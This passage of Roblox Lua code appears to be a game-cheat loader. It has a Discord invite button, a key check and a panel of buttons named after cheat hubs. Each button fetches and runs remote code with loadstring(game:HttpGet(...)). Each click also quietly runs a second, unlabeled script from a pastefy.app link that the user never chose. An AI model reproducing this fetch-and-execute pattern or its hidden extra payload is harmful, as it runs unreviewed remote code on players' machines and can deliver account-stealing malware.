copyBtn.MouseButton1Click:Connect(function()
	clickSound:Play()
	setclipboard("https://discord.gg/D3pDdGJW")
end)

local function createSecondUI()
    local sgui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    local frm = Instance.new("Frame", sgui)
    frm.Size = UDim2.new(0.4, 0, 0.35, 0)
    frm.Position = UDim2.new(0.3, 0, 0.35, 0)
    frm.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frm.BorderSizePixel = 0
    frm.AnchorPoint = Vector2.new(0.5, 0.5)
    frm.Position = UDim2.new(0.5, 0, 0.5, 0)
    frm.BackgroundTransparency = 1
    Instance.new("UICorner", frm).CornerRadius = UDim.new(0, 20)

    frm:TweenSizeAndPosition(
        UDim2.new(0.4, 0, 0.35, 0),
        UDim2.new(0.5, 0, 0.5, 0),
        Enum.EasingDirection.Out,
        Enum.EasingStyle.Back,
        0.4,
        false,
        function()
            TweenService:Create(frm, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()
        end
    )

    local function addButton(text, pos, script1)
        local btn = Instance.new("TextButton", frm)
        btn.Size = UDim2.new(0.8, 0, 0.2, 0)
        btn.Position = pos
        btn.Text = text
        btn.BackgroundColor3 = Color3.fromRGB(0, 160, 0)
        btn.TextColor3 = Color3.new(1, 1, 1)
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)

        btn.MouseButton1Click:Connect(function()
            clickSound:Play()
            sgui:Destroy()
            loadstring(game:HttpGet(script1))()
            wait(0.3)
             loadstring(game:HttpGet("https://pastefy.app/emS2cnf9/raw", true))()
        end)
    end

    addButton("üîÆ Zap Hub PS99", UDim2.new(0.1, 0, 0.1, 0), "https://zaphub.xyz/Exec")
    addButton("üíé PET GO", UDim2.new(0.1, 0, 0.4, 0), "https://zaphub.xyz/Exec")
    addButton("üî• BGSI OP", UDim2.new(0.1, 0, 0.7, 0), "https://raw.githubusercontent.com/Verteniasty/Pet-rbx/refs/heads/main/loadstring")
end

checkBtn.MouseButton1Click:Connect(function()
	clickSound:Play()
    local key = box.Text
    if key == "" then return end

    for _, validKey in pairs(VALID_KEYS) do
        if key == validKey then
            gui:Destroy()
            createSecondUI()
            return
        end
    end

    box.Text = "‚ùå Ung√ºltiger Key"
end)
